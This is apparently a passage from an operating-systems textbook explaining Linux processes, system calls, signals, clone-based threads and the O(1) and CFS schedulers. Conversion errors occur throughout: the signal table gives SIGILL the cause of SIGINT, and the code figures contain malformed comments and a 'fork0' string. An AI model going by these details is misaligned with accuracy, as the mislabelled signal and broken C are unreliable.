While the three components are represented separately in the figure, they are highly interdependent. File systems typically access files through the block devices. However, in order to hide the large latencies of disk accesses, files are copied into the page cache in main memory. Some files may even be dynamically created and may have only an in-memory representation, such as files providing some run-time resource usage information. In addition, the virtual memory system may rely on a disk partition or in-file swap area to back up parts of the main memory when it needs to free up certain pages, and therefore relies on the I/O component. Numerous other interdependencies exist.

In addition to the static in-kernel components, Linux supports dynamically loadable modules. These modules can be used to add or replace the default device drivers, file system, networking, or other kernel codes. The modules are not shown in Fig. 10-3.

Finally, at the very top is the system call interface into the kernel. All system calls come here, causing a trap which switches the execution from user mode into protected kernel mode and passes control to one of the kernel components described above.

### 10.3 PROCESSES IN LINUX

In the previous sections, we started out by looking at Linux as viewed from the keyboard, that is, what the user sees in an xterm window. We gave examples of shell commands and utility programs that are frequently used. We ended with a brief overview of the system structure. Now it is time to dig deeply into the kernel and look more closely at the basic concepts Linux supports, namely, processes, memory, the file system, and input/output. These notions are important because the system calls-the interface to the operating system itself-manipulate them. For example, system calls exist to create processes and threads, allocate memory, open files, and do I/O.

Unfortunately, with so many versions of Linux in existence, there are some differences between them. In this chapter, we will emphasize the features common to all of them rather than focus on any one specific version. Thus in certain sections (especially implementation sections), the discussion may not apply equally to every version.

### 10.3.1 Fundamental Concepts

The main active entities in a Linux system are the processes. Linux processes are very similar to the classical sequential processes that we studied in Chap 2. Each process runs a single program and initially has a single thread of control. In other words, it has one program counter, which keeps track of the next instruction to be executed. Linux allows a process to create additional threads once it starts.

Linux is a multiprogramming system, so multiple, independent processes may be running at the same time. Furthermore, each user may have several active processes at once, so on a large system, there may be hundreds or even thousands of processes running. In fact, on most single-user workstations, even when the user is absent, dozens of background processes, called daemons, are running. These are started by a shell script when the system is booted. ("Daemon" is a variant spelling of "demon," which is a self-employed evil spirit.)

A typical daemon is the cron daemon. It wakes up once a minute to check if there is any work for it to do. If so, it does the work. Then it goes back to sleep until it is time for the next check.

This daemon is needed because it is possible in Linux to schedule activities minutes, hours, days, or even months in the future. For example, suppose a user has a dentist appointment at 3 o'clock next Tuesday. He can make an entry in the cron daemon's database telling the daemon to beep at him at, say, 2:30. When the appointed day and time arrives, the cron daemon sees that it has work to do, and starts up the beeping program as a new process.

The cron daemon is also used to start up periodic activities, such as making daily disk backups at 4 A.M., or reminding forgetful users every year on October 31 to stock up on trick-or-treat goodies for Halloween. Other daemons handle incoming and outgoing electronic mail, manage the line printer queue, check if there are enough free pages in memory, and so forth. Daemons are straightforward to implement in Linux because each one is a separate process, independent of all other processes.

Processes are created in Linux in an especially simple manner. The fork system call creates an exact copy of the original process. The forking process is called the parent process. The new process is called the child process. The parent and child each have their own, private memory images. If the parent subsequently changes any of its variables, the changes are not visible to the child, and vice versa.

Open files are shared between parent and child. That is, if a certain file was open in the parent before the fork, it will continue to be open in both the parent and the child afterward. Changes made to the file by either one will be visible to the other. This behavior is only reasonable, because these changes are also visible to any unrelated process that opens the file.

The fact that the memory images, variables, registers, and everything else are identical in the parent and child leads to a small difficulty: How do the processes know which one should run the parent code and which one should run the child code? The secret is that the fork system call returns a 0 to the child and a nonzero value, the child's PID (Process Identifier), to the parent. Both processes normally check the return value and act accordingly, as shown in Fig. 10-4.

Processes are named by their PIDs. When a process is created, the parent is given the child's PID, as mentioned above. If the child wants to know its own PID, there is a system call, getpid, that provides it. PIDs are used in a variety of ways. For example, when a child terminates, the parent is given the PID of the child that
```

pid = fork( ); /* if the fork succeeds, pid > 0 in the parent */
if (pid < 0) {
handle_error( ); /* fork failed (e.g., memory or some table is full) */
} else if (pid > 0) {
/* parent code goes here. /*/
} else {
/* child code goes here. /*/
}

```

Figure 10-4. Process creation in Linux.
just finished. This can be important because a parent may have many children. Since children may also have children, an original process can build up an entire tree of children, grandchildren, and further descendants.

Processes in Linux can communicate with each other using a form of message passing. It is possible to create a channel between two processes into which one process can write a stream of bytes for the other to read. These channels are called pipes. Synchronization is possible because when a process tries to read from an empty pipe it is blocked until data are available.

Shell pipelines are implemented with pipes. When the shell sees a line like
```

sort <f | head

```

it creates two processes, sort and head, and sets up a pipe between them in such a way that sort's standard output is connected to head's standard input. In this way, all the data that sort writes go directly to head, instead of going to a file. If the pipe fills, the system stops running sort until head has removed some data from it.

Processes can also communicate in another way besides pipes: software interrupts. A process can send what is called a signal to another process. Processes can tell the system what they want to happen when an incoming signal arrives. The choices available are to ignore it, to catch it, or to let the signal kill the process. Terminatingthe process is the default for most signals. If a process elects to catch signals sent to it, it must specify a signal-handling procedure. When a signal arrives, control will abruptly switch to the handler. When the handler is finished and returns, control goes back to where it came from, analogous to hardware I/O interrupts. A process can send signals only to members of its process group, which consists of its parent (and further ancestors), siblings, and children (and further descendants). A process may also send a signal to all members of its process group with a single system call.

Signals are also used for other purposes. For example, if a process is doing floating-point arithmetic, and inadvertently divides by 0 (something that mathematicians tend to frown upon), it gets a SIGFPE (floating-point exception) signal. Some of the signals that are required by POSIX are listed in Fig. 10-5. Many Linux systems have additional signals as well, but programs using them may not be portable to other versions of Linux and UNIX in general.

| Signal | Cause |
| :--- | :--- |
| SIGABRT | Sent to abort a process and force a core dump |
| SIGALRM | The alarm clock has gone off |
| SIGFPE | A floating-point error has occurred (e.g., division by 0) |
| SIGHUP | The phone line the process was using has been hung up |
| SIGILL | The user has hit the DEL key to interrupt the process |
| SIGQUIT | The user has hit the key requesting a core dump |
| SIGKILL | Sent to kill a process (cannot be caught or ignored) |
| SIGPIPE | The process has written to a pipe which has no readers |
| SIGSEGV | The process has referenced an invalid memory address |
| SIGTERM | Used to request that a process terminate gracefully |
| SIGUSR1 | Available for application-defined purposes |
| SIGUSR2 | Available for application-defined purposes |

Figure 10-5. Some of the signals required by POSIX.

### 10.3.2 Process-Management System Calls in Linux

Let us now look at the Linux system calls dealing with process management. The main ones are listed in Fig. 10-6. Fork is a good place to start the discussion. The Fork system call, supported also by other traditional UNIX systems, is the main way to create a new process in Linux systems. (We will discuss another alternative in the following section.) It creates an exact duplicate of the original process, including all the file descriptors, registers, and everything else. After the fork, the original process and the copy (the parent and child) go their separate ways. All the variables have identical values at the time of the fork, but since the entire parent address space is copied to create the child, subsequent changes in one of them do not affect the other. The fork call returns a value, which is zero in the child, and equal to the child's PID in the parent. Using the returned PID, the two processes can see which is the parent and which is the child.

In most cases, after a fork, the child will need to execute different code from the parent. Consider the case of the shell. It reads a command from the terminal, forks off a child process, waits for the child to execute the command, and then reads the next command when the child terminates. To wait for the child to finish, the parent executes a waitpid system call, which just waits until the child terminates (any child if more than one exists). Waitpid has three parameters. The first one allows the caller to wait for a specific child. If it is -1, any old child (i.e., the first child to terminate) will do. The second parameter is the address of a variable that will be set to the child's exit status (normal or abnormal termination and exit value). This allows the parent to know the fate of its child. The third parameter determines whether the caller blocks or returns if no child is already terminated.

| System call | Description |
| :--- | :--- |
| pid = fork( ) | Create a child process identical to the parent |
| pid = waitpid(pid, \&statloc, opts) | Wait for a child to terminate |
| s = execve(name, argv, envp) | Replace a process' core image |
| exit(status) | Terminate process execution and return status |
| $\mathrm{s}=$ sigaction(sig, \&act, \&oldact) | Define action to take on signals |
| s = sigreturn(\&context) | Return from a signal |
| s = sigprocmask(how, \&set, \&old) | Examine or change the signal mask |
| s = sigpending(set) | Get the set of blocked signals |
| s = sigsuspend(sigmask) | Replace the signal mask and suspend the process |
| s = kill(pid, sig) | Send a signal to a process |
| residual = alarm(seconds) | Set the alarm clock |
| s = pause( ) | Suspend the caller until the next signal |

Figure 10-6. Some system calls relating to processes. The return code $s$ is -1 if an error has occurred, pid is a process ID, and residual is the remaining time in the previous alarm. The parameters are what the names suggest.

In the case of the shell, the child process must execute the command typed by the user. It does this by using the exec system call, which causes its entire core image to be replaced by the file named in its first parameter. A highly simplified shell illustrating the use of fork, waitpid, and exec is shown in Fig. 10-7.

In the most general case, exec has three parameters: the name of the file to be executed, a pointer to the argument array, and a pointer to the environment array. These will be described shortly. Various library procedures, such as execl, execv, execle, and execve, are provided to allow the parameters to be omitted or specified in various ways. All of these procedures invoke the same underlying system call. Although the system call is exec, there is no library procedure with this name; one of the others must be used.

Let us consider the case of a command typed to the shell, such as
> cp file1 file2

used to copy file1 to file2. After the shell has forked, the child locates and executes the file $c p$ and passes it information about the files to be copied.

The main program of $c p$ (and many other programs) contains the function declaration
> main(argc, argv, envp)

where $\operatorname{argc}$ is a count of the number of items on the command line, including the program name. For the example above, $\operatorname{argc}$ is 3.

The second parameter, argv, is a pointer to an array. Element $i$ of that array is a pointer to the $i$ th string on the command line. In our example, $\operatorname{argv}[0]$ would point
```

while (TRUE) { /* repeat forever /*/
type_prompt( ); /* display prompt on the screen */
read_command(command, params); /* read input line from keyboard */
pid = fork( ); /* fork off a child process */
if (pid < 0) {
printf(“Unable to fork0); /* error condition */
continue; /* repeat the loop */
}
if (pid != 0) {
waitpid (-1, &status, 0); /* parent waits for child */
} else {
execve(command, params, 0); /* child does the work */
}
}

```

Figure 10-7. A highly simplified shell.
to the two-character string "cp". Similarly, $\arg v[1]$ would point to the five-character string "file1" and $\operatorname{argv}[2]$ would point to the five-character string "file2".

The third parameter of main, envp, is a pointer to the environment, an array of strings containing assignments of the form name = value used to pass information such as the terminal type and home directory name to a program. In Fig. 10-7, no environment is passed to the child, so that the third parameter of execve is a zero in this case.

If exec seems complicated, do not despair; it is the most complex system call. All the rest are much simpler. As an example of a simple one, consider exit, which processes should use when they are finished executing. It has one parameter, the exit status (0 to 255), which is returned to the parent in the variable status of the waitpid system call. The low-order byte of status contains the termination status, with 0 being normal termination and the other values being various error conditions. The high-order byte contains the child's exit status (0 to 255), as specified in the child's call to exit. For example, if a parent process executes the statement
```

n = waitpid(-1, &status, 0);

```

it will be suspended until some child process terminates. If the child exits with, say, 4 as the parameter to exit, the parent will be awakened with $n$ set to the child's PID and status set to 0×0400 (0x as a prefix means hexadecimal in C). The low-order byte of status relates to signals; the next one is the value the child returned in its call to exit.

If a process exits and its parent has not yet waited for it, the process enters a kind of suspended animation called the zombie state-the living dead. When the parent finally waits for it, the process terminates.

Several system calls relate to signals, which are used in a variety of ways. For example, if a user accidentally tells a text editor to display the entire contents of a very long file, and then realizes the error, some way is needed to interrupt the editor. The usual choice is for the user to hit some special key (e.g., DEL or CTRL-C), which sends a signal to the editor. The editor catches the signal and stops the print-out.

To announce its willingness to catch this (or any other) signal, the process can use the sigaction system call. The first parameter is the signal to be caught (see Fig. 10-5). The second is a pointer to a structure giving a pointer to the signal-han-dling procedure, as well as some other bits and flags. The third one points to a structure where the system returns information about signal handling currently in effect, in case it must be restored later.

The signal handler may run for as long as it wants to. In practice, though, signal handlers are usually fairly short. When the signal-handling procedure is done, it returns to the point from which it was interrupted.

The sigaction system call can also be used to cause a signal to be ignored, or to restore the default action, which is killing the process.

Hitting the DEL key is not the only way to send a signal. The kill system call allows a process to signal another related process. The choice of the name "kill" for this system call is not an especially good one, since most processes send signals to other ones with the intention that they be caught. However, a signal that is not caught, does, indeed, kill the recipient.

For many real-time applications, a process needs to be interrupted after a specific time interval to do something, such as to retransmit a potentially lost packet over an unreliable communication line. To handle this situation, the alarm system call has been provided. The parameter specifies an interval, in seconds, after which a SIGALRM signal is sent to the process. A process may have only one alarm outstanding at any instant. If an alarm call is made with a parameter of 10 seconds, and then 3 seconds later another alarm call is made with a parameter of 20 seconds, only one signal will be generated, 20 seconds after the second call. The first signal is canceled by the second call to alarm. If the parameter to alarm is zero, any pending alarm signal is canceled. If an alarm signal is not caught, the default action is taken and the signaled process is killed. Technically, alarm signals may be ignored, but that is a pointless thing to do. Why would a program ask to be signaled later on and then ignore the signal?

It sometimes occurs that a process has nothing to do until a signal arrives. For example, consider a computer-aided instruction program that is testing reading speed and comprehension. It displays some text on the screen and then calls alarm to signal it after 30 seconds. While the student is reading the text, the program has nothing to do. It could sit in a tight loop doing nothing, but that would waste CPU time that a background process or other user might need. A better solution is to use the pause system call, which tells Linux to suspend the process until the next signal arrives. Woe be it to the program that calls pause with no alarm pending.

### 10.3.3 Implementation of Processes and Threads in Linux

A process in Linux is like an iceberg: you only see the part above the water, but there is also an important part underneath. Every process has a user part that runs the user program. However, when one of its threads makes a system call, it traps to kernel mode and begins running in kernel context, with a different memory map and full access to all machine resources. It is still the same thread, but now with more power and also its own kernel mode stack and kernel mode program counter. These are important because a system call can block partway through, for example, waiting for a disk operation to complete. The program counter and registers are then saved so the thread can be restarted in kernel mode later.

The Linux kernel internally represents processes as tasks, via the structure task_struct. Unlike other OS approaches (which make a distinction between a process, lightweight process, and thread), Linux uses the task structure to represent any execution context. Therefore, a single-threaded process will be represented with one task structure and a multithreaded process will have one task structure for each of the user-level threads. Finally, the kernel itself is multithreaded, and has kernel-level threads which are not associated with any user process and are executing kernel code. We will return to the treatment of multithreaded processes (and threads in general) later in this section.

For each process, a process descriptor of type task_struct is resident in memory at all times. It contains vital information needed for the kernel's management of all processes, including scheduling parameters, lists of open-file descriptors, and so on. The process descriptor along with memory for the kernel-mode stack for the process are created upon process creation.

For compatibility with other UNIX systems, Linux identifies processes via the PID. The kernel organizes all processes in a doubly linked list of task structures. In addition to accessing process descriptors by traversing the linked lists, the PID can be mapped to the address of the task structure, and the process information can be accessed immediately.

The task structure contains a variety of fields. Some of these fields contain pointers to other data structures or segments, such as those containing information about open files. Some of these segments are related to the user-level structure of the process, which is not of interest when the user process is not runnable. Therefore, these may be swapped or paged out, in order not to waste memory on information that is not needed. For example, although it is possible for a process to be sent a signal while it is swapped out, it is not possible for it to read a file. For this reason, information about signals must be in memory all the time, even when the process is not present in memory. On the other hand, information about file descriptors can be kept in the user structure and brought in only when the process is in memory and runnable.

The information in the process descriptor falls into a number of broad categories that can be roughly described as follows:

1. Scheduling parameters. Process priority, amount of CPU time consumed recently, amount of time spent sleeping recently. Together, these are used to determine which process to run next.
2. Memory image. Pointers to the text, data, and stack segments, or page tables. If the text segment is shared, the text pointer points to the shared text table. When the process is not in memory, information about how to find its parts on disk is here too.
3. Signals. Masks showing which signals are being ignored, which are being caught, which are being temporarily blocked, and which are in the process of being delivered.
4. Machine registers. When a trap to the kernel occurs, the machine registers (including the floating-point ones, if used) are saved here.
5. System call state. Information about the current system call, including the parameters, and results.
6. File descriptor table. When a system call involving a file descriptor is invoked, the file descriptor is used as an index into this table to locate the in-core data structure (i-node) corresponding to this file.
7. Accounting. Pointer to a table that keeps track of the user and system CPU time used by the process. Some systems also maintain limits here on the amount of CPU time a process may use, the maximum size of its stack, the number of page frames it may consume, and other items.
8. Kernel stack. A fixed stack for use by the kernel part of the process.
9. Miscellaneous. Current process state, event being waited for, if any, time until alarm clock goes off, PID, PID of the parent process, and user and group identification.

Keeping this information in mind, it is now easy to explain how processes are created in Linux. The mechanism for creating a new process is actually fairly straightforward. A new process descriptor and user area are created for the child process and filled in largely from the parent. The child is given a PID, its memory map is set up, and it is given shared access to its parent's files. Then its registers are set up and it is ready to run.

When a fork system call is executed, the calling process traps to the kernel and creates a task structure and few other accompanying data structures, such as the kernel-mode stack and a thread_info structure. This structure is allocated at a fixed offset from the process' end-of-stack, and contains few process parameters, along
with the address of the process descriptor. By storing the process descriptor's address at a fixed location, Linux needs only few efficient operations to locate the task structure for a running process.

The majority of the process-descriptor contents are filled out based on the parent's descriptor values. Linux then looks for an available PID, that is, not one currently in use by any process, and updates the PID hash-table entry to point to the new task structure. In case of collisions in the hash table, process descriptors may be chained. It also sets the fields in the task_struct to point to the corresponding previous/next process on the task array.

In principle, it should now allocate memory for the child's data and stack segments, and to make exact copies of the parent's segments, since the semantics of fork say that no memory is shared between parent and child. The text segment may be either copied or shared since it is read only. At this point, the child is ready to run.

However, copying memory is expensive, so all modern Linux systems cheat. They give the child its own page tables, but have them point to the parent's pages, only marked read only. Whenever either process (the child or the parent) tries to write on a page, it gets a protection fault. The kernel sees this and then allocates a new copy of the page to the faulting process and marks it read/write. In this way, only pages that are actually written have to be copied. This mechanism is called copy on write. It has the additional benefit of not requiring two copies of the program in memory, thus saving RAM.

After the child process starts running, the code running there (a copy of the shell in our example) does an exec system call giving the command name as a parameter. The kernel now finds and verifies the executable file, copies the arguments and environment strings to the kernel, and releases the old address space and its page tables.

Now the new address space must be created and filled in. If the system supports mapped files, as Linux and virtually all other UNIX-based systems do, the new page tables are set up to indicate that no pages are in memory, except perhaps one stack page, but that the address space is backed by the executable file on disk. When the new process starts running, it will immediately get a page fault, which will cause the first page of code to be paged in from the executable file. In this way, nothing has to be loaded in advance, so programs can start quickly and fault in just those pages they need and no more. (This strategy is really just demand paging in its most pure form, as we discussed in Chap. 3.) Finally, the arguments and environment strings are copied to the new stack, the signals are reset, and the registers are initialized to all zeros. At this point, the new command can start running.

Figure 10-8 illustrates the steps described above through the following example: A user types a command, Is, on the terminal, the shell creates a new process by forking off a clone of itself. The new shell then calls exec to overlay its memory with the contents of the executable file $l s$. After that, $l s$ can start.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-204_749_1193_242_170.jpg)
Figure 10-8. The steps in executing the command $l s$ typed to the shell.

## Threads in Linux

We discussed threads in a general way in Chap. 2. Here we will focus on kernel threads in Linux, particularly on the differences among the Linux thread model and other UNIX systems. In order to better understand the unique capabilities provided by the Linux model, we start with a discussion of some of the challenging decisions present in multithreaded systems.

The main issue in introducing threads is maintaining the correct traditional UNIX semantics. First consider fork. Suppose that a process with multiple (kernel) threads does a fork system call. Should all the other threads be created in the new process? For the moment, let us answer that question with yes. Suppose that one of the other threads was blocked reading from the keyboard. Should the corresponding thread in the new process also be blocked reading from the keyboard? If so, which one gets the next line typed? If not, what should that thread be doing in the new process?

The same problem holds for many other things threads can do. In a single-threaded process, the problem does not arise because the one and only thread cannot be blocked when calling fork. Now consider the case that the other threads are not created in the child process. Suppose that one of the not-created threads holds a mutex that the one-and-only thread in the new process tries to acquire after doing the fork. The mutex will never be released and the one thread will hang forever. Numerous other problems exist, too. There is no simple solution.

File I/O is another problem area. Suppose that one thread is blocked reading from a file and another thread closes the file or does an Iseek to change the current file pointer. What happens next? Who knows?

Signal handling is another thorny issue. Should signals be directed at a specific thread or just at the process? A SIGFPE (floating-point exception) should probably be caught by the thread that caused it. What if it does not catch it? Should just that thread be killed, or all threads? Now consider the SIGINT signal, generated by the user at the keyboard. Which thread should catch that? Should all threads share a common set of signal masks? All solutions to these and other problems usually cause something to break somewhere. Getting the semantics of threads right (not to mention the code) is a nontrivial business.

Linux supports kernel threads in an interesting way that is worth looking at. The implementation is based on ideas from 4.4BSD, but kernel threads were not enabled in that distribution because Berkeley ran out of money before the C library could be rewritten to solve the problems discussed above.

Historically, processes were resource containers and threads were the units of execution. A process contained one or more threads that shared the address space, open files, signal handlers, alarms, and everything else. Everything was clear and simple as described above.

In 2000, Linux introduced a powerful new system call, clone, that blurred the distinction between processes and threads and possibly even inverted the primacy of the two concepts. Clone is not present in any other version of UNIX. Classically, when a new thread was created, the original thread(s) and the new one shared everything but their registers. In particular, file descriptors for open files, signal handlers, alarms, and other global properties were per process, not per thread. What clone did was make it possible for each of these aspects and others to be process specific or thread specific. It is called as follows:
```

pid = clone(function, stack_ptr, sharing_flags, arg);

```

The call creates a new thread, either in the current process or in a new process, depending on sharing_flags. If the new thread is in the current process, it shares the address space with the existing threads, and every subsequent write to any byte in the address space by any thread is immediately visible to all the other threads in the process. On the other hand, if the address space is not shared, then the new thread gets an exact copy of the address space, but subsequent writes by the new thread are not visible to the old ones. These semantics are the same as POSIX fork.

In both cases, the new thread begins executing at function, which is called with arg as its only parameter. Also in both cases, the new thread gets its own private stack, with the stack pointer initialized to stack_ptr.

The sharing_flags parameter is a bitmap that allows a finer grain of sharing than traditional UNIX systems. Each of the bits can be set independently of the other ones, and each of them determines whether the new thread copies some data
structure or shares it with the calling thread. Fig. 10-9 shows some of the items that can be shared or copied according to bits in sharing_flags.

| Flag | Meaning when set | Meaning when cleared |
| :--- | :--- | :--- |
| CLONE_VM | Create a new thread | Create a new process |
| CLONE_FS | Share umask, root, and working dirs | Do not share them |
| CLONE_FILES | Share the file descriptors | Copy the file descriptors |
| CLONE_SIGHAND | Share the signal handler table | Copy the table |
| CLONE_PARENT | New thread has same parent as the caller | New thread's parent is caller |

Figure 10-9. Bits in the sharing_flags bitmap.

The CLONE_VM bit determines whether the virtual memory (i.e., address space) is shared with the old threads or copied. If it is set, the new thread just moves in with the existing ones, so the clone call effectively creates a new thread in an existing process. If the bit is cleared, the new thread gets its own private address space. Having its own address space means that the effect of its STORE instructions is not visible to the existing threads. This behavior is similar to fork, except as noted below. Creating a new address space is effectively the definition of a new process.

The CLONE_FS bit controls sharing of the root and working directories and of the umask flag. Even if the new thread has its own address space, if this bit is set, the old and new threads share working directories. This means that a call to chdir by one thread changes the working directory of the other thread, even though the other thread may have its own address space. In UNIX, a call to chdir by a thread always changes the working directory for other threads in its process, but never for threads in another process. Thus this bit enables a kind of sharing not possible in traditional UNIX versions.

The CLONE_FILES bit is analogous to the CLONE_FS bit. If set, the new thread shares its file descriptors with the old ones, so calls to lseek by one thread are visible to the other ones, again as normally holds for threads within the same process but not for threads in different processes. Similarly, CLONE_SIGHAND enables or disables the sharing of the signal handler table between the old and new threads. If the table is shared, even among threads in different address spaces, then changing a handler in one thread affects the handlers in the others.

Finally, every process has a parent. The CLONE_PARENT bit controls who the parent of the new thread is. It can either be the same as the calling thread (in which case the new thread is a sibling of the caller) or it can be the calling thread itself, in which case the new thread is a child of the caller. There are a few other bits that control other items, but they are less important.

This fine-grained sharing is possible because Linux maintains separate data structures for the various items listed in Sec. 10.3.3 (scheduling parameters, memory image, and so on). The task structure just points to these data structures, so it
is easy to make a new task structure for each cloned thread and have it point either to the old thread's scheduling, memory, and other data structures or to copies of them. The fact that such fine-grained sharing is possible does not mean that it is useful, however, especially since traditional UNIX versions do not offer this functionality. A Linux program that takes advantage of it is then no longer portable to UNIX.

The Linux thread model raises another difficulty. UNIX systems associate a single PID with a process, independent of whether it is single- or multithreaded. In order to be compatible with other UNIX systems, Linux distinguishes between a process identifier (PID) and a task identifier (TID). Both fields are stored in the task structure. When clone is used to create a new process that shares nothing with its creator, PID is set to a new value; otherwise, the task receives a new TID, but inherits the PID. In this manner all threads in a process will receive the same PID as the first thread in the process.

### 10.3.4 Scheduling in Linux

We will now look at the Linux scheduling algorithm. To start with, Linux threads are kernel threads, so scheduling is based on threads, not processes.

Linux distinguishes three classes of threads for scheduling purposes:

1. Real-time FIFO.
2. Real-time round robin.
3. Timesharing.

Real-time FIFO threads are the highest priority and are not preemptable except by a newly readied real-time FIFO thread with even higher priority. Real-time roundrobin threads are the same as real-time FIFO threads except that they have time quanta associated with them, and are preemptable by the clock. If multiple realtime round-robin threads are ready, each one is run for its quantum, after which it goes to the end of the list of real-time round-robin threads. Neither of these classes is actually real time in any sense. Deadlines cannot be specified and guarantees are not given. These classes are simply higher priority than threads in the standard timesharing class. The reason Linux calls them real time is that Linux is conformant to the P1003.4 standard ("real-time" extensions to UNIX) which uses those names. The real-time threads are internally represented with priority levels from 0 to 99,0 being the highest and 99 the lowest real-time priority level.

The conventional, non-real-time threads form a separate class and are scheduled by a separate algorithm so they do not compete with the real-time threads. Internally, these threads are associated with priority levels from 100 to 139, that is, Linux internally distinguishes among 140 priority levels (for real-time and non-real-time tasks). As for the real-time round-robin threads, Linux allocates CPU time to the non-real-time tasks based on their requirements and their priority levels.

In Linux, time is measured as the number of clock ticks. In older Linux versions, the clock ran at 1000Hz and each tick was 1ms, called a jiffy. In newer versions, the tick frequency can be configured to 500, 250 or even 1Hz. In order to avoid wasting CPU cycles for servicing the timer interrupt, the kernel can even be configured in "tickless" mode. This is useful when there is only one process running in the system, or when the CPU is idle and needs to go into power-saving mode. Finally, on newer systems, high-resolution timers allow the kernel to keep track of time in sub-jiffy granularity.

Like most UNIX systems, Linux associates a nice value with each thread. The default is 0, but this can be changed using the nice(value) system call, where value ranges from -20 to +19. This value determines the static priority of each thread. A user computing $\pi$ to a billion places in the background might put this call in his program to be nice to the other users. Only the system administrator may ask for better than normal service (meaning values from -20 to -1). Deducing the reason for this rule is left as an exercise for the reader.

Next, we will describe in more detail two of the Linux scheduling algorithms. Their internals are closely related to the design of the runqueue, a key data structure used by the scheduler to track all runnable tasks in the system and select the next one to run. A runqueue is associated with each CPU in the system.

Historically, a popular Linux scheduler was the Linux O(1) scheduler. It received its name because it was able to perform task-management operations, such as selecting a task or enqueueing a task on the runqueue, in constant time, independent of the total number of tasks in the system. In the O(1) scheduler, the runqueue is organized in two arrays, active and expired. As shown in Fig. 10-10(a), each of these is an array of 140 list heads, each corresponding to a different priority. Each list head points to a doubly linked list of processes at a given priority. The basic operation of the scheduler can be described as follows.

The scheduler selects a task from the highest-priority list in the active array. If that task's timeslice (quantum) expires, it is moved to the expired list (potentially at a different priority level). If the task blocks, for instance to wait on an I/O event, before its timeslice expires, once the event occurs and its execution can resume, it is placed back on the original active array, and its timeslice is decremented to reflect the CPU time it already used. Once its timeslice is fully exhausted, it, too, will be placed on the expired array. When there are no more tasks in the active array, the scheduler simply swaps the pointers, so the expired arrays now become active, and vice versa. This method ensures that low-priority tasks will not starve (except when real-time FIFO threads completely hog the CPU, which is unlikely).

Here, different priority levels are assigned different timeslice values, with higher quanta assigned to higher-priority processes. For instance, tasks running at priority level 100 will receive time quanta of 800 msec, whereas tasks at priority level of 139 will receive 5 msec.

The idea behind this scheme is to get processes out of the kernel fast. If a process is trying to read a disk file, making it wait a second between read calls will

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-209_936_1273_266_138.jpg)
Figure 10-10. Illustration of Linux runqueue data structures for (a) the Linux O(1) scheduler, and (b) the Completely Fair Scheduler.

slow it down enormously. It is far better to let it run immediately after each request is completed, so that it can make the next one quickly. Similarly, if a process was blocked waiting for keyboard input, it is clearly an interactive process, and as such should be given a high priority as soon as it is ready in order to ensure that interactive processes get good service. In this light, CPU-bound processes basically get any service that is left over when all the I/O bound and interactive processes are blocked.

Since Linux (or any other OS) does not know a priori whether a task is I/O- or CPU-bound, it relies on continuously maintaining interactivity heuristics. In this manner, Linux distinguishes between static and dynamic priority. The threads' dynamic priority is continuously recalculated, so as to (1) reward interactive threads, and (2) punish CPU-hogging threads. In the O(1) scheduler, the maximum priority bonus is -5, since lower-priority values correspond to higher priority received by the scheduler. The maximum priority penalty is +5. The scheduler maintains a sleep_avg variable associated with each task. Whenever a task is awakened, this variable is incremented. Whenever a task is preempted or when its quantum expires, this variable is decremented by the corresponding value. This value is used
to dynamically map the task's bonus to values from -5 to +5. The scheduler recalculates the new priority level as a thread is moved from the active to the expired list.

The O(1) scheduling algorithm refers to the scheduler made popular in the early versions of the 2.6 kernel, and was first introduced in the unstable 2.5 kernel. Prior algorithms exhibited poor performance in multiprocessor settings and did not scale well with an increased number of tasks. Since the description presented in the above paragraphs indicates that a scheduling decision can be made through access to the appropriate active list, it can be done in constant O(1) time, independent of the number of processes in the system. However, in spite of the desirable property of constant-time operation, the O(1) scheduler had significant shortcomings. Most notably, the heuristics used to determine the interactivity of a task, and therefore its priority level, were complex and imperfect, and resulted in poor performance for interactive tasks.

To address this issue, Ingo Molnar, who also created the O(1) scheduler, proposed a new scheduler called Completely Fair Scheduler or CFS. CFS was based on ideas originally developed by Con Kolivas for an earlier scheduler, and was first integrated into the 2.6.23 release of the kernel. It is still the default scheduler for the non-real-time tasks.

The main idea behind CFS is to use a red-black tree as the runqueue data structure. Tasks are ordered in the tree based on the amount of time they spend running on the CPU, called vruntime. CFS accounts for the tasks' running time with nanosecond granularity. As shown in Fig. 10-10(b), each internal node in the tree corresponds to a task. The children to the left correspond to tasks which had less time on the CPU, and therefore will be scheduled sooner, and the children to the right on the node are those that have consumed more CPU time thus far. The leaves in the tree do not play any role in the scheduler.

The scheduling algorithm can be summarized as follows. CFS always schedules the task which has had least amount of time on the CPU, typically the leftmost node in the tree. Periodically, CFS increments the task's vruntime value based on the time it has already run, and compares this to the current leftmost node in the tree. If the running task still has smaller vruntime, it will continue to run. Otherwise, it will be inserted at the appropriate place in the red-black tree, and the CPU will be given to task corresponding to the new leftmost node.

To account for differences in task priorities and "niceness," CFS changes the effective rate at which a task's virtual time passes when it is running on the CPU. For lower-priority tasks, time passes more quickly, their vruntime value will increase more rapidly, and, depending on other tasks in the system, they will lose the CPU and be reinserted in the tree sooner than if they had a higher priority value. In this manner, CFS avoids using separate runqueue structures for different priority levels.

In summary, selecting a node to run can be done in constant time, whereas inserting a task in the runqueue is done in $\mathrm{O}(\log (N))$ time, where $N$ is the number
of tasks in the system. Given the levels of load in current systems, this continues to be acceptable, but as the compute capacity of the nodes, and the number of tasks they can run, increase, particularly in the server space, it is possible that new scheduling algorithms will be proposed in the future.

Besides the basic scheduling alogirithm, the Linux scheduler includes special features particularly useful for multiprocessor or multicore platforms. First, the runqueue structure is associated with each CPU in the multiprocessing platform. The scheduler tries to maintain benefits from affinity scheduling, and to schedule tasks on the CPU on which they were previously executing. Second, a set of system calls is available to further specify or modify the affinity requirements of a select thread. Finally, the scheduler performs periodic load balancing across runqueues of different CPUs to ensure that the system load is well balanced, while still meeting certain performance or affinity requirements.

The scheduler considers only runnable tasks, which are placed on the appropriate runqueue. Tasks which are not runnable and are waiting on various I/O operations or other kernel events are placed on another data structure, waitqueue. A waitqueue is associated with each event that tasks may wait on. The head of the waitqueue includes a pointer to a linked list of tasks and a spinlock. The spinlock is necessary so as to ensure that the waitqueue can be concurrently manipulated through both the main kernel code and interrupt handlers or other asynchronous invocations.

## Synchronization in Linux

In the previous section we mentioned that Linux uses spinlocks to prevent concurrent modifications to data structures like the waitqueues. In fact, the kernel code contains synchronization variables in numerous locations. We will next briefly summarize the synchronization constructs available in Linux.

